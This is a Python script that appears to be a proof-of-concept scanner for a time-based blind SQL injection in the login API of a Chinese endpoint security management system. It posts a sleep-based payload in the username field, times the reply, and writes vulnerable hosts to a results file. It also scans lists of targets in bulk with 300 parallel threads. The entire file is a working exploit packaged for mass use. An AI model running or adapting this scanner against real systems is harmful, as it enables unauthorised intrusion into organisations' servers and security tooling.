import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """

  ____   ___  _       _        _           _   _             
 / ___| / _ \| |     (_)_ __  (_) ___  ___| |_(_) ___  _ __  
 \___ \| | | | |     | | '_ \ | |/ _ \/ __| __| |/ _ \| '_ \ 
  ___) | |_| | |___  | | | | || |  __/ (__| |_| | (_) | | | |
 |____/ \__\_\_____| |_|_| |_|/ |\___|\___|\__|_|\___/|_| |_|
                            |__/                                                                  
"""
    print(test)

def poc(target):
    payload = '/api/user/login'
    url = target + payload
    headers = {
        "Content-Length": "102",
        "X-Requested-With": "XMLHttpRequest",
        "Sec-Ch-Ua-Mobile": "?0",
        "User-Agent": "Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/128.0.0.0Safari/537.36Edg/128.0.0.0",
        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Accept-Encoding": "gzip,deflate,br",
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
        "Priority": "u=1,i",
    }
    data = "captcha=&password=21232f297a57a5a743894a0e4a801fc3&username=admin'and(select*from(select+sleep(3))a)='"
    try:
        res = requests.post(url, headers=headers, data=data, verify=False)
        time = str(res.elapsed.total_seconds())[0]
        #print(time)
        if '2' < time < '4':
            print(f'该{target}存在延时注入')
            with open('result.txt', 'a') as f:
                f.write(target + '\n')
        else:
            print(f'该url{target}不存在延时注入')
    except Exception as e:
        print(f'该网站{target}可能存在问题，请手工测试')


def main():
    banner()
    parser = argparse.ArgumentParser(description="辰信景云终端安全管理系统 login存在 SQL注入漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help='input link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='file path')
    args = parser.parse_args()
    try:
        if args.url and not args.file:
            poc(args.url)
        elif not args.url and args.file:
            url_list = []
            with open(args.file, 'r', encoding='utf-8') as fp:
                for i in fp.readlines():
                    url_list.append(i.strip().replace('\n', ''))
            mp = Pool(300)
            mp.map(poc, url_list)
            mp.close()
            mp.join()
        else:
            print(f"Usag:\n\t python3 {sys.argv[0]} -h")
    except Exception as e:
        print(f'usage: {sys.argv[0]} <url or file>')



if __name__ == '__main__':
    main()